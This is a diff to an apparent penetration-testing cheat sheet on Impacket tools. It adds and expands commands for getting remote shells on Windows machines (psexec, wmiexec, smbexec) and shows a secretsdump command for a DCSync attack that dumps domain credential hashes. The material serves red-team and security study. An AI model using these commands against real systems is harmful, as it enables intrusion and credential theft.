@@ -2,7 +2,7 @@ Impacket is a suite of tools that is massively useful when compromising Windows 
 
 # Impacket-PSExec
 ```shell
-impacket-psexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine (if user has local administrator rights)
+impacket-psexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine via PsExec (if user has local administrator rights). Requires transferring a binary to the target machine.
 ```
 
 # Impacket-WMIExec
@@ -12,8 +12,9 @@ impacket-wmiexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine
 WMIExec is marginally more stealthy than PSExec but it has WMI as an obvious prerequisite. 
 
 # Impacket-SMBExec
-TODO: Finish
-
+```shell
+impacket-smbexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine via SMB named pipes without transferring a binary.
+```
 # Impacket-SecretsDump
 ```shell
 impacket-secretsdump -outputfile <hashes outfile> -just-dc <domain>/<user>@<DC_IP> # Perform DCSync attack against a domain controller with Domain Admin credentials or other user creds with DCSync rights. 
